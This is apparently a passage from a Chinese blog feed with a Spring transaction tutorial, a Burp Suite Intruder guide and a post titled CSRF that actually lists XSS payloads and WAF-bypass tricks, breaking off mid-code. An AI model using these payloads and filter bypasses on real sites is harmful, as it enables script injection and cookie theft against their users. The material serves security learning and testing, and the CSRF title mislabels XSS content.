class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> CheckoutService checkoutService;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(Integer[] bookIds, Integer userId)</span>&#123;</span><br><span class="line">    checkoutService.checkout(bookIds, userId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在数据库中将用户的余额修改为100元</p><h4 id="③观察结果-4"><a href="#③观察结果-4" class="headerlink" title="③观察结果"></a>③观察结果</h4><p>可以通过@Transactional中的propagation属性设置事务传播行为</p><p>修改BookServiceImpl中buyBook()上，注解@Transactional的propagation属性</p><p>@Transactional(propagation &#x3D; Propagation.REQUIRED)，默认情况，表示如果当前线程上有已经开</p><p>启的事务可用，那么就在这个事务中运行。经过观察，购买图书的方法buyBook()在checkout()中被调</p><p>用，checkout()上有事务注解，因此在此事务中执行。所购买的两本图书的价格为80和50，而用户的余额为100，因此在购买第二本图书时余额不足失败，导致整个checkout()回滚，即只要有一本书买不</p><p>了，就都买不了</p><p>@Transactional(propagation &#x3D; Propagation.REQUIRES_NEW)，表示不管当前线程上是否有已经开启的事务，都要开启新事务。同样的场景，每次购买图书都是在buyBook()的事务中执行，因此第一本图书购买成功，事务结束，第二本图书购买失败，只在第二次的buyBook()中回滚，购买第一本图书不受影响，即能买几本就买几本</p><h2 id="4-4、基于XML的声明式事务"><a href="#4-4、基于XML的声明式事务" class="headerlink" title="4.4、基于XML的声明式事务"></a>4.4、基于XML的声明式事务</h2><h3 id="4-3-1、场景模拟"><a href="#4-3-1、场景模拟" class="headerlink" title="4.3.1、场景模拟"></a>4.3.1、场景模拟</h3><p>参考基于注解的声明式事务</p><h3 id="4-3-2、修改Spring配置文件"><a href="#4-3-2、修改Spring配置文件" class="headerlink" title="4.3.2、修改Spring配置文件"></a>4.3.2、修改Spring配置文件</h3><p>将Spring配置文件中去掉tx:annotation-driven 标签，并添加配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置事务通知和切入点表达式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(*com.atguigu.spring.tx.xml.service.impl.*.*(..))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:advisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tx:advice标签：配置事务通知 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- id属性：给事务通知标签设置唯一标识，便于引用 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- transaction-manager属性：关联事务管理器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- tx:method标签：配置具体的事务方法 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- name属性：指定方法名，可以使用星号代表多个字符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;get*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;query*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;find*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- read-only属性：设置只读属性 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- rollback-for属性：设置回滚的异常 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- no-rollback-for属性：设置不回滚的异常 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- isolation属性：设置事务的隔离级别 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- timeout属性：设置事务的超时属性 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- propagation属性：设置事务的传播行为 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;save*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;false&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRES_NEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;update*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;false&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRES_NEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;delete*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;false&quot;</span> <span class="attr">rollback-for</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRES_NEW&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：基于xml实现的声明式事务，必须引入aspectJ的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp使用技巧</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/Burp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/Burp%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="1-简易使用"><a href="#1-简易使用" class="headerlink" title="1.简易使用"></a>1.简易使用</h2><ul><li>控制台输入 <code>document.cookie</code>快速获取cookie</li><li>修改请求并发送<br><img src="/images/Pasted%20image%2020230402234101.png"></li></ul><h2 id="2-Intruder-攻击模块"><a href="#2-Intruder-攻击模块" class="headerlink" title="2. Intruder 攻击模块"></a>2. Intruder 攻击模块</h2><blockquote><p>Burp Intruder 是一个强大的工具，用于自动对 Web 应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。…</p></blockquote><p><strong>一、简介</strong></p><p>Burp Intruder 是一个强大的工具，用于自动对 Web 应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。</p><p><strong>二、模块说明</strong></p><p>Burp Intruder 主要有四个模块组成:</p><p>1：Target 用于配置目标<a href="https://cloud.tencent.com/product/cvm?from=20065&from_column=20065">服务器</a>进行攻击的详细信息。 2：Positions  设置 Payloads 的插入点以及攻击类型（攻击模式）。 3：Payloads  设置 payload，配置字典 4：Opetions   此选项卡包含了 request headers，request engine，attack results ，grep match，grep_extrack，grep payloads 和 redirections。你可以发动攻击之前，在主要 Intruder 的 UI 上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><p><strong>1：Target 目标选项 (Target tab)</strong></p><p>这个选项是用来配置目标服务器的细节：</p><p><img src="https://ask.qcloudimg.com/http-save/9283430/50dca0b9b5b0771904efecca7380ba0f.png?imageView2/2/w/2560/h/7000"></p><p><strong>2：Positions 位置选项 (Positions tab)</strong></p><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：</p><p><img src="https://ask.qcloudimg.com/http-save/9283430/5244fbb98731deac7dc6c6149b1b2659.png?imageView2/2/w/2560/h/7000"></p><p>使用一对 § 字符来标记出有效负荷的位置，在这两个符号直接包含了模板文本的内容。当把一个有效负荷放置到一个给出的请求的特殊位置上时，就把这 § 符号放到这个位置，然后在两个符号之间的出现的文本都会被有效负荷替换。当有个特殊位置没有为一个给出的请求安排有效负荷时 (这只适用”sniper” 攻击类型)，那个位置的 § 字符会被删除，出现在它们之间的文本不会变化。</p><p>当使用 Burp Suite 发送一个其他地方的请求时，Burp Intruder 会对你最想放置有效负荷的位置做一个最好的猜测，并且它把这些放置在每个 URL 和主体参数的值里，以及每个 cookie 里。每个标记和它中间的文本都会被加亮以显得更清晰。你可以使用 Intruder 菜单上的选项标记的位置是要替换还是附加现有的参数值。在上面的请求编辑器里，指出了定义位置的数量和文本模板的大小。</p><p>你可以使用选项上的按钮来控制位置上的标记：</p><ol><li>add § — 在当前光标位置插入一个位置标记。 2. clear § — 删除整个模板或选中的部分模板里的位置标记。 3. auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞 (SQL 注入) 快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。 4.refresh — 如果需要，可以刷新编辑器里有颜色的代码。 5.clear — 删除整个编辑器内容。</li></ol><p><strong>3：Payloads 有效负荷选项 (Payloads tab)</strong></p><p>这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置 (最多 8 个) 配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。</p><p><strong>选项 1：Payload Sets</strong> Payload 数量类型设置</p><p><strong>选项 2：Payload Opetions[Simple list]</strong>  该选项会根据选项 1 中 Payload type 的设置而改变</p><p><img src="https://ask.qcloudimg.com/http-save/9283430/05c49a75c3c36970adb8aac3a5cc7c8c.png"></p><p><strong>选项 3：Payload Processing</strong> 对生成的 Payload 进行编码、加密、截取等操作</p><p><img src="https://ask.qcloudimg.com/http-save/9283430/b2c69792ef6b531f40848bc5bee90ebc.png"></p><p><strong>选项 4：Payload Encoding</strong> 你可以配置哪些有效载荷中的字符应该是 URL 编码的 HTTP 请求中的安全传输。任何已配置的 URL 编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终 URL 编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的 grep 选项来检查响应为呼应有效载荷的最终 URL 编码应用之前。</p><p><img src="https://ask.qcloudimg.com/http-save/9283430/ed360cd49629a76d64350a8603eda7a6.png"></p><p><strong>4：Opetions  选项卡 (Options tab)</strong> 此选项卡包含了 request headers，request engine，attack results ，grep match，grep_extrack，grep payloads 和 redirections。你可以发动攻击之前，在主要 Intruder 的 UI 上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><p><strong>选项 1：Request Headers 这些设置控制在 Intruder 是否更新配置请求头。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/fd07d4f6e7366cf28c5b8029961ea22e.png"></p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。</p><p><strong>选项 2：Request Engine 设置发送请求的线程、超时重试等。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/b5991d52503163ae0bc50f335361f2dd.png"></p><p><strong>选项 3：Attack Results 设置攻击结果的显示。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/46f2caa6ca68baecbdf972d114ada773.png"></p><p><strong>选项 4：Grep – Match 在响应中找出存在指定的内容的一项。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/4c156cae16fcfec5222c6e7b0e0cdd85.png"></p><p><strong>选项 5：Grep – Extract 通过正则提取返回信息中的内容。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/01c22215be27e6e1a84f08f0864740bf.png"></p><p><strong>选项 6：Grep – Payloads  这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite 会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/a36bc1d00ec0ef47d10e8c095bfaba74.png"></p><p><strong>选项 7：Redirections 重定向响应，控制 Burp 在进行攻击时如何处理重定向。</strong></p><p><img src="https://ask.qcloudimg.com/http-save/9283430/80c4ae5d90ab3fb8d7afc6c1d8a80ebc.png"></p><h3 id="Burp-Suite-Intruder-的-4-种攻击类型"><a href="#Burp-Suite-Intruder-的-4-种攻击类型" class="headerlink" title="Burp Suite Intruder 的 4 种攻击类型"></a><strong>Burp Suite Intruder 的 4 种攻击类型</strong></h3><h3 id="一-Sniper（狙击手模式）"><a href="#一-Sniper（狙击手模式）" class="headerlink" title="一 Sniper（狙击手模式）"></a><strong>一 Sniper（狙击手模式）</strong></h3><p>狙击手模式使用一组 payload 集合，它一次只使用一个 payload 位置，假设你标记了两个位置 “A” 和“B”，payload 值为 “1” 和“2”，那么它攻击会形成以下组合（除原始数据外）：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><p>1</p></td><td><p>1</p></td><td><p>no replace</p></td></tr><tr><td><p>2</p></td><td><p>2</p></td><td><p>no replace</p></td></tr><tr><td><p>3</p></td><td><p>no replace</p></td><td><p>1</p></td></tr><tr><td><p>4</p></td><td><p>no replace</p></td><td><p>2</p></td></tr></tbody></table><h3 id="二-Battering-ram（攻城锤模式）"><a href="#二-Battering-ram（攻城锤模式）" class="headerlink" title="二 Battering ram（攻城锤模式）"></a><strong>二 Battering ram（攻城锤模式）</strong></h3><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个 payload 集合，不同的地方在于每次攻击都是替换所有 payload 标记位置，而狙击手模式每次只能替换一个 payload 标记位置。</p><h3 id="三-Pitchfork（草叉模式）"><a href="#三-Pitchfork（草叉模式）" class="headerlink" title="三 Pitchfork（草叉模式）"></a><strong>三 Pitchfork（草叉模式）</strong></h3><p>草叉模式允许使用多组 payload 组合，在每个标记位置上遍历所有 payload 组合，假设有两个位置 “A” 和“B”，payload 组合 1 的值为 “1” 和“2”，payload 组合 2 的值为 “3” 和“4”，则攻击模式如下：</p><h3 id="四-Cluster-bomb（集束炸弹模式）"><a href="#四-Cluster-bomb（集束炸弹模式）" class="headerlink" title="四 Cluster bomb（集束炸弹模式）"></a><strong>四 Cluster bomb（集束炸弹模式）</strong></h3><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对 payload 组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除 baseline 请求外，会有四次请求。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站请求伪造攻击</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、常用-payload"><a href="#一、常用-payload" class="headerlink" title="一、常用 payload"></a>一、常用 payload</h1><h2 id="1、echo"><a href="#1、echo" class="headerlink" title="1、echo"></a>1、echo</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、img-标签"><a href="#2、img-标签" class="headerlink" title="2、img 标签"></a>2、img 标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&quot;xss&quot;</span>)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:<span class="title function_ invoke__">alert</span>(String.<span class="title function_ invoke__">formCharCode</span>(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))&gt;</span><br><span class="line">&lt;img scr=<span class="string">&quot;URL&quot;</span> style=<span class="string">&#x27;Xss:expression(alert(xss));&#x27;</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="keyword">eval</span>(<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>)&gt;</span><br><span class="line">&lt;img src=x onmouseover=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="3、CSS"><a href="#3、CSS" class="headerlink" title="3、CSS"></a>3、CSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img STYLE=<span class="string">&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="4、href"><a href="#4、href" class="headerlink" title="4、href"></a>4、href</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;a href=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;baidu&lt;/a&gt;</span><br><span class="line">XSS利用方式<span class="number">1</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;aa&lt;/a&gt;</span><br><span class="line"> &lt;a href=javascript:<span class="keyword">eval</span>(<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>))&gt;aa&lt;/a&gt;</span><br><span class="line"> &lt;a href=<span class="string">&quot;javascript:aaa&quot;</span> onmouseover=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;aa&lt;/a&gt;</span><br><span class="line"> XSS利用方式<span class="number">2</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br><span class="line"> &lt;a href=<span class="string">&quot;&quot;</span> onclick=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式<span class="number">3</span></span><br><span class="line">&lt;a href=<span class="string">&quot;&quot;</span> onclick=<span class="keyword">eval</span>(<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>))&gt;aa&lt;/a&gt;</span><br><span class="line">XSS利用方式<span class="number">4</span></span><br><span class="line">&lt;a href=kycg.asp?ttt=<span class="number">1000</span> onmouseover=<span class="title function_ invoke__">prompt</span>(<span class="string">&#x27;xss&#x27;</span>) y=<span class="number">2016</span>&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="5、form-标签"><a href="#5、form-标签" class="headerlink" title="5、form 标签"></a>5、form 标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式<span class="number">1</span></span><br><span class="line">&lt;form action=javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>) method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">&lt;form action=javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br><span class="line">XSS利用方式<span class="number">2</span></span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=<span class="title function_ invoke__">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br><span class="line">&lt;form action=<span class="number">1</span> onmouseover=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="6、input-标签"><a href="#6、input-标签" class="headerlink" title="6、input 标签"></a>6、input 标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;input &gt;</span><br><span class="line">利用方式<span class="number">1</span></span><br><span class="line">&lt;input value=<span class="string">&quot;&quot;</span> onclick=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>) type=<span class="string">&quot;text&quot;</span>&gt;</span><br><span class="line">利用方式<span class="number">2</span></span><br><span class="line">&lt;input &gt;</span><br><span class="line">利用方式<span class="number">4</span></span><br><span class="line">&lt;input &gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="7、iframe-标签"><a href="#7、iframe-标签" class="headerlink" title="7、iframe 标签"></a>7、iframe 标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XSS利用方式<span class="number">1</span></span><br><span class="line">&lt;iframe src=javascript:<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;xss&#x27;</span>);height=<span class="number">5</span>width=<span class="number">1000</span> /&gt;&lt;iframe&gt;</span><br><span class="line">XSS利用方式<span class="number">2</span></span><br><span class="line">&lt;iframe src=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line"> &lt;iframe src=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line"> &lt;!--base64编码--&gt;</span><br><span class="line"> &lt;iframe src=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span><br><span class="line">XSS利用方式<span class="number">3</span></span><br><span class="line">&lt;iframe src=<span class="string">&quot;aaa&quot;</span> οnmο<span class="keyword">use</span>ο<span class="title">ver</span>=<span class="title">alert</span>(&#x27;<span class="title">xss</span>&#x27;) /&gt;&lt;<span class="title">iframe</span>&gt;</span><br><span class="line"><span class="title">XSS</span>利用方式3</span><br><span class="line">&lt;<span class="title">iframe</span> <span class="title">src</span>=&quot;<span class="title">javascript</span>:<span class="title">prompt</span>(`<span class="title">xss</span>`)&quot;&gt;&lt;/<span class="title">iframe</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="8、svg-标签"><a href="#8、svg-标签" class="headerlink" title="8、svg 标签"></a>8、svg 标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="9、其他"><a href="#9、其他" class="headerlink" title="9、其他"></a>9、其他</h2><ul><li>事件型还有 onbody 标签</li></ul><h1 id="二、常用的绕过-Waf"><a href="#二、常用的绕过-Waf" class="headerlink" title="二、常用的绕过 Waf"></a>二、常用的绕过 Waf</h1><h2 id="1、利用大小写绕过"><a href="#1、利用大小写绕过" class="headerlink" title="1、利用大小写绕过"></a>1、利用大小写绕过</h2><p>这个绕过方式的出现是因为网站仅仅只过滤了<code>&lt;script&gt;</code>标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样： <code>&lt;sCriPt&gt;alert(1)&lt;/SCripT&gt;</code></p><h2 id="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"><a href="#2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）" class="headerlink" title="2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）"></a>2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）</h2><p>有的只过滤了一次 script 标签，因此可以使用双写来绕过<code>&lt;sCri&lt;script&gt;Pt&gt;alert(1)&lt;/SC&lt;/script&gt;ripT&gt;</code></p><h2 id="3、并不是只有-script-标签才可以插入代码"><a href="#3、并不是只有-script-标签才可以插入代码" class="headerlink" title="3、并不是只有 script 标签才可以插入代码"></a>3、并不是只有 script 标签才可以插入代码</h2><h3 id="（1）img-标签"><a href="#（1）img-标签" class="headerlink" title="（1）img 标签"></a>（1）img 标签</h3><p><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>就可以再次愉快的弹窗。原因很简单，我们指定的图片地址根本不存在也就是一定会发生错误，这时候 onerror 里面的代码自然就得到了执行。</p><h3 id="（2）onmouseover-事件"><a href="#（2）onmouseover-事件" class="headerlink" title="（2）onmouseover 事件"></a>（2）onmouseover 事件</h3><ul><li><p><code>onmouseover=&quot;alert(1)&quot;</code>，比如</p><ul><li><p><code>&lt;a onmousemove=&quot;do something here&quot;&gt;</code> 当用户鼠标移动时即可运行代码</p></li><li><p><code>&lt;div onmouseover=&quot;do something here&quot;&gt;</code> 当用户鼠标在这个块上面时即可运行（可以配合 weight 等参数将 div 覆盖页面，鼠标不划过都不行）</p></li></ul></li></ul><h3 id="（3）onclick-事件"><a href="#（3）onclick-事件" class="headerlink" title="（3）onclick 事件"></a>（3）onclick 事件</h3><p><code>onclick=&quot;alert(1)&quot;</code> 这个要点击后才能运行代码，条件相对苛刻，就不再详述。</p><h3 id="（4）onload-事件"><a href="#（4）onload-事件" class="headerlink" title="（4）onload 事件"></a>（4）onload 事件</h3><p>比如以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 